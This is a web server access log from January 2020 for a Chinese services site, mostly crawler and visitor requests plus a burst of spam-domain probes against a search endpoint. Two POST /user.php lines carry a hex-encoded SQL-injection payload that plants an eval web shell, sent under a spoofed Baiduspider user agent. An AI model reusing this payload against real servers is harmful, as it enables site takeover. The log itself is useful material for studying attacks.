111.231.81.165 - - [15/Jan/2020:11:59:10 +0800] "HEAD /search/f?querystr=www.bzkjic.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-cn; Redmi Note 4X Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.6.5-BetaNULL"
111.231.81.165 - - [15/Jan/2020:11:59:11 +0800] "HEAD /search/f?querystr=www.daixiefabiao.net HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn; 2014812 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.4.11NULL"
111.231.81.165 - - [15/Jan/2020:11:59:11 +0800] "HEAD /search/f?querystr=www.ymwears.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; MI 5s Build/MXB48T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.9.5NULL"
111.231.81.165 - - [15/Jan/2020:11:59:11 +0800] "HEAD /search/f?querystr=www.hellgo.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; GEM-703LT Build/HUAWEIGEM-703LT) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.2 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:12 +0800] "HEAD /search/f?querystr=www.csavion.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone 6; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/6.0 MQQBrowser/6.9 Mobile/14G60 Safari/8536.25 MttCustomUA/2NULL"
111.231.81.165 - - [15/Jan/2020:11:59:13 +0800] "HEAD /search/f?querystr=www.kyoook.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.0; TA-1000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043507 Safari/537.36 MicroMessenger/6.5.7.1041 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:13 +0800] "HEAD /search/f?querystr=www.cnfysl.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; 1801-A01 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044111 Mobile Safari/537.36 V1_AND_SQ_7.6.5_864_YYB_D QQ/7.6.5.3595 NetType/WIFI WebP/0.3.0 Pixel/1080NULL"
111.231.81.165 - - [15/Jan/2020:11:59:14 +0800] "HEAD /search/f?querystr=www.xiaofus.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; E6533 Build/32.3.A.2.33) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:14 +0800] "HEAD /search/f?querystr=www.hesaids.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; VKY-AL00 Build/HUAWEIVKY-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.7.7.957 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:14 +0800] "HEAD /search/f?querystr=www.soyipin.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone 6p; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 MQQBrowser/7.6.0 Mobile/12B411 Safari/8536.25 MttCustomUA/2 QBWebViewType/1NULL"
111.231.81.165 - - [15/Jan/2020:11:59:15 +0800] "HEAD /search/f?querystr=www.osramds.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044027 Mobile Safari/537.36 V1_AND_SQ_7.5.5_806_YYB_D QQ/7.5.5.3460 NetType/WIFI WebP/0.3.0 Pixel/1080NULL"
111.231.81.165 - - [15/Jan/2020:11:59:16 +0800] "HEAD /search/f?querystr=www.fsymc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 5.1.1; Redmi Note 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.5.22.1160 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:16 +0800] "HEAD /search/f?querystr=www.somegou.com HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO R9tm Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.4 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:17 +0800] "HEAD /search/f?querystr=www.futianymc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 baiduboxapp/0_7.0.2.8_enohpi_1002_5211/5.3.9_1C2%257enohPi/1099a/2CAF8EF6F7377A9D9A1A2BF9BC3DEA9861789D59CFCSKHNDCPT/1NULL"
111.231.81.165 - - [15/Jan/2020:11:59:18 +0800] "HEAD /search/f?querystr=www.dongguans.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 6.0.1; MI 5s Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043520 Safari/537.36 V1_AND_SQ_7.2.0_730_YYB_D QQ/7.2.0.3270 NetType/WIFI WebP/0.3.0 Pixel/1080NULL"
111.231.81.165 - - [15/Jan/2020:11:59:19 +0800] "HEAD /search/f?querystr=www.dongguanb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; Meitu M4 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.5.1) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21NULL"
111.231.81.165 - - [15/Jan/2020:11:59:19 +0800] "HEAD /search/f?querystr=www.dongguanz.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; MI 5 Build/MXB48T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.85 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.4.3NULL"
111.231.81.165 - - [15/Jan/2020:11:59:20 +0800] "HEAD /search/f?querystr=www.dongguand.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 baiduboxapp/0_9.1.0.8_enohpi_4331_057/1.3.9_2C2%257enohPi/1099a/4F5D33F0DEE72F80247F2EEC751414C9D3F8055F3OCQQFSDKLD/1NULL"
111.231.81.165 - - [15/Jan/2020:11:59:20 +0800] "HEAD /search/f?querystr=www.dongguane.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.0; ZUK Z2121 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044030 Mobile Safari/537.36 MicroMessenger/6.6.6.1300(0x26060637) NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:21 +0800] "HEAD /search/f?querystr=www.dongguanf.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.0; FRD-AL00 Build/HUAWEIFRD-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043613 Safari/537.36 MicroMessenger/6.5.16.1120 NetType/WIFI Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:21 +0800] "HEAD /search/f?querystr=www.dongguanh.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E277 baiduboxapp/0_01.0.4.8_enohpi_4331_057/3.01_1C2%258enohPi/1099a/5E7811DA50D1F721350A1D0AA63F8F377CBE40C99OCAISFFKRD/1NULL"
111.231.81.165 - - [15/Jan/2020:11:59:22 +0800] "HEAD /search/f?querystr=www.guangzhoua.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.1.1; ZTE A2017 Build/NMF26V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/10.0 lite baiduboxapp/2.8.0.10 (Baidu; P1 7.1.1)NULL"
111.231.81.165 - - [15/Jan/2020:11:59:22 +0800] "HEAD /search/f?querystr=www.dongguanc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 4.4.4; SM-G5308W Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/35.0.1916.138 Mobile Safari/537.36 T7/7.1 baiduboxapp/8.0 (Baidu; P1 4.4.4)NULL"
111.231.81.165 - - [15/Jan/2020:11:59:23 +0800] "HEAD /search/f?querystr=www.heyuana.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; vivo X6D Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.7 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:24 +0800] "HEAD /search/f?querystr=www.shenzhenga.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; Android 7.0; TRT-AL00A Build/HUAWEITRT-AL00A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043307 Safari/537.36 MicroMessenger/6.5.10.1080 NetType/4G Language/zh_CNNULL"
111.231.81.165 - - [15/Jan/2020:11:59:24 +0800] "HEAD /search/f?querystr=www.zhuhaia.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-cn; BND-AL10 Build/HONORBND-AL10) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/8.0 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:24 +0800] "HEAD /search/f?querystr=www.shenzhengb.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; MI 4LTE Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.14NULL"
111.231.81.165 - - [15/Jan/2020:11:59:26 +0800] "HEAD /search/f?querystr=www.shenzhengc.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-cn; H60-L01 Build/HDH60-L01) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.4 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:26 +0800] "HEAD /search/f?querystr=www.shenzhengg.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; m3 note Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.2.5.884 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:27 +0800] "HEAD /search/f?querystr=www.shenzhenge.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 7.0; zh-CN; EVA-TL00 Build/HUAWEIEVA-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.9.941 Mobile Safari/537.36NULL"
111.231.81.165 - - [15/Jan/2020:11:59:27 +0800] "HEAD /search/f?querystr=www.shenzhengf.cn HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Linux; U; Android 6.0.1; zh-CN; OPPO R9sk Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.0.960 UWS/2.12.1.22 Mobile Safari/537.36 AliApp(TB/7.6.3) UCBS/2.11.1.1 WindVane/8.3.0 1080X1920NULL"
120.253.194.66 - - [15/Jan/2020:11:59:38 +0800] "GET / HTTP/1.1" 301 178 "https://www.baidu.com/link?url=l1-tR9a64QhAbrNKV_bwTX8bKWhakf4Darc-j789bmcGyY5yvoa8R2Bo2jEnj32X&wd=&eqid=901bd934000430c1000000035e1e8e28" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15"
114.102.184.204 - - [15/Jan/2020:12:00:13 +0800] "GET / HTTP/1.1" 301 178 "https://www.baidu.com/link?url=2kTGax-34x3hAuY15u_MDyb2StIS4Nv2WY7CxLRiUgIvbpXzsHbP9dkYnhxROnx8&wd=&eqid=9748575b0007adfd000000045e1e8e0d" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"
46.229.168.163 - - [15/Jan/2020:12:00:34 +0800] "GET /fw_7192 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
134.209.198.237 - - [15/Jan/2020:12:01:18 +0800] "GET /loginbbs?bbsurl=http://bbs.xiaoyuer.com HTTP/1.1" 301 178 "http://bbs.xiaoyuer.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
134.209.198.237 - - [15/Jan/2020:12:01:26 +0800] "GET /loginbbs?bbsurl=http://bbs.xiaoyuer.com HTTP/1.1" 301 178 "http://bbs.xiaoyuer.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
49.7.20.144 - - [15/Jan/2020:12:01:38 +0800] "GET /fuwu_scyx HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:01:49 +0800] "GET /shop/changeLabelDetail?mill=1501524548885&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
134.209.198.237 - - [15/Jan/2020:12:01:51 +0800] "GET /loginbbs?bbsurl=http://bbs.xiaoyuer.com HTTP/1.1" 301 178 "http://bbs.xiaoyuer.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
111.202.102.66 - - [15/Jan/2020:12:02:03 +0800] "GET /robots.txt HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
134.209.198.237 - - [15/Jan/2020:12:02:10 +0800] "GET /loginbbs?bbsurl=http://bbs.xiaoyuer.com HTTP/1.1" 301 178 "http://bbs.xiaoyuer.com/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
180.122.168.56 - - [15/Jan/2020:12:02:33 +0800] "POST /user.php HTTP/1.1" 301 178 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\x22id\x22;s:3:\x22'/*\x22;s:3:\x22num\x22;s:201:\x22*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\x22;s:4:\x22name\x22;s:3:\x22ads\x22;}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.122.168.56 - - [15/Jan/2020:12:02:33 +0800] "POST /user.php HTTP/1.1" 301 178 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\x22num\x22;s:207:\x22*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\x22;s:2:\x22id\x22;s:9:\x22' union/*\x22;s:4:\x22name\x22;s:3:\x22ads\x22;}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
95.142.83.80 - - [15/Jan/2020:12:03:01 +0800] "GET /favicon.ico HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
49.7.20.144 - - [15/Jan/2020:12:04:22 +0800] "GET /shop/changeLabelDetail?mill=1471433844352&labelId=4 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
14.116.141.188 - - [15/Jan/2020:12:05:02 +0800] "GET / HTTP/1.1" 301 178 "https://so.m.sm.cn/s?uc_param_str=dnntnwvepffrgibijbprsvdsei&from=wh10521&q=%E5%B0%8F%E9%B1%BC%E5%84%BF%E7%B2%BE%E5%87%86%E7%BD%91%E7%AB%99&uc_sm=1" "Mozilla/5.0 (Linux; U; Android 10; zh-CN; ELE-AL00 Build/HUAWEIELE-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.8.0.1060 Mobile Safari/537.36"
49.7.20.144 - - [15/Jan/2020:12:05:15 +0800] "GET /fuwu_sjhh_pmsj HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
36.158.18.129 - - [15/Jan/2020:12:05:32 +0800] "GET /favicon.ico HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400"
49.7.20.144 - - [15/Jan/2020:12:05:44 +0800] "GET /shop/changeLabelDetail?mill=1472816516358&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:06:07 +0800] "GET /xq_3673 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:06:37 +0800] "GET /usercenterent/phome/comment/require/614 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:07:50 +0800] "GET /shop/changeLabelDetail?mill=1491243483868&labelId=4 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:09:00 +0800] "GET /shop/changeLabelDetail?mill=1506212587253&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.150 - - [15/Jan/2020:12:09:15 +0800] "GET /shop/changeLabelDetail?labelId=2&mill=1516886307686 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
183.249.233.122 - - [15/Jan/2020:12:11:37 +0800] "GET /auth?targetUrl=http%3A%2F%2Fwww.xiaoyuer.com%2Fusercenter%2Fhome%2Fservice%2Findex.htm&ticket=login:pc:792CF0FAB7E23D74F00D815B8391D41C HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
183.249.233.122 - - [15/Jan/2020:12:11:37 +0800] "GET /usercenter/home/service/index.htm HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0"
49.7.20.144 - - [15/Jan/2020:12:12:22 +0800] "GET /shop/changeLabelDetail?mill=1506121160525&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:13:37 +0800] "GET /shop/changeLabelDetail?mill=1471433844352&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
54.36.148.29 - - [15/Jan/2020:12:13:48 +0800] "GET /usercenter/phome/require/129193 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)"
49.7.20.144 - - [15/Jan/2020:12:13:49 +0800] "GET /fuwu_rjkf_wxkf HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
111.202.102.66 - - [15/Jan/2020:12:13:59 +0800] "GET / HTTP/1.1" 301 178 "http://www.sogou.com/web?query=site%3Awww.xiaoyuer.com" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
49.7.20.144 - - [15/Jan/2020:12:14:22 +0800] "GET /shop/changeLabelDetail?mill=1501527208915&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
111.200.39.118 - - [15/Jan/2020:12:14:58 +0800] "GET / HTTP/1.0" 301 178 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
14.215.176.141 - - [15/Jan/2020:12:15:09 +0800] "GET / HTTP/1.0" 301 178 "https://m.baidu.com/" "Mozilla/5.0 (Linux; Android 9; PAR-AL00 Build/HUAWEIPAR-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36 T7/11.12 baiduboxapp/11.12.0.10 (Baidu; P1 9)"
49.7.20.144 - - [15/Jan/2020:12:15:44 +0800] "GET /usercenter/pcommon/1/50683 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:16:26 +0800] "GET /shop/changeLabelDetail?mill=1472816647282&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.136 - - [15/Jan/2020:12:16:39 +0800] "GET /xq_499 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
134.119.189.29 - - [15/Jan/2020:12:17:42 +0800] "GET / HTTP/1.1" 301 178 "http://www.xiaoyuer.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
58.221.42.16 - - [15/Jan/2020:12:19:16 +0800] "GET / HTTP/1.1" 301 178 "http://www.xiaoyuer.com" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
66.249.71.103 - - [15/Jan/2020:12:21:32 +0800] "GET /fw_7047 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.36.148.192 - - [15/Jan/2020:12:23:02 +0800] "GET /homepage/req/131761 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)"
49.7.20.144 - - [15/Jan/2020:12:24:05 +0800] "GET /fuwu_xzfy_kyfy HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
46.229.168.137 - - [15/Jan/2020:12:24:54 +0800] "GET /fw_2939 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
46.229.168.134 - - [15/Jan/2020:12:25:15 +0800] "GET /fw_6843 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/6~bl; +http://www.semrush.com/bot.html)"
49.7.20.144 - - [15/Jan/2020:12:26:45 +0800] "GET /fuwu_shfw_qt HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:26:59 +0800] "GET /fuwu_xzfy_wgzx HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:27:10 +0800] "GET /fuwu_sjhh_gysj HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:27:20 +0800] "GET /fuwu_sjhh_gczt HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:27:30 +0800] "GET /fuwu?_class=%E5%AD%A6%E5%89%8D%E6%95%99%E8%82%B2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:27:40 +0800] "GET /shop/changeLabelDetail?mill=1471441452328&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
125.92.172.143 - - [15/Jan/2020:12:27:48 +0800] "GET /css/G/basicII.css?v=95dc756ff4 HTTP/1.1" 301 178 "http://c.360webcache.com/c?m=4d103ac7404cdd99db96578e17409de4&q=%E5%B0%8F%E9%B1%BC%E7%BD%91&u=http%3A%2F%2Fwww.xiaoyuer.com%2F" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
125.92.172.143 - - [15/Jan/2020:12:27:48 +0800] "GET /css/B/index/index.css?v=bffb105807 HTTP/1.1" 301 178 "http://c.360webcache.com/c?m=4d103ac7404cdd99db96578e17409de4&q=%E5%B0%8F%E9%B1%BC%E7%BD%91&u=http%3A%2F%2Fwww.xiaoyuer.com%2F" "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
49.7.20.144 - - [15/Jan/2020:12:27:50 +0800] "GET /shop/changeLabelDetail?mill=1471384117235&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:28:01 +0800] "GET /shop/changeLabelDetail?mill=1495347901705&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:28:11 +0800] "GET /shop/changeLabelDetail?mill=1472881326253&labelId=1 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:28:21 +0800] "GET /shop/changeLabelDetail?mill=1495851236220&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:28:31 +0800] "GET /shop/changeLabelDetail?mill=1471384268239&labelId=2 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
49.7.20.144 - - [15/Jan/2020:12:28:41 +0800] "GET /shop/changeLabelDetail?mill=1477220347774&labelId=3 HTTP/1.1" 301 178 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
